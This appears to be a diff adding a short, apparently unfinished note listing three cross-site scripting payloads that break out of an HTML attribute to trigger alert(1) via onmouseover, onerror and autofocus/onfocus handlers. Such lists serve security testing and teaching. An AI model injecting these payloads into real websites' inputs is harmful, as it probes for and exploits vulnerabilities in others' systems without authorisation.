@@ -1,0 +1,14 @@
+[Xss payloards]
+
+1. cross-site scripting attack that injects an attribute and calls the alert function. 
+
+Basic attribute injection
+" onmouseover="alert(1)
+
+Using an image error handler
+" onerror="alert(1)" src=x
+
+Input field autofocus trigger
+" autofocus onfocus="alert(1)
+
+2.
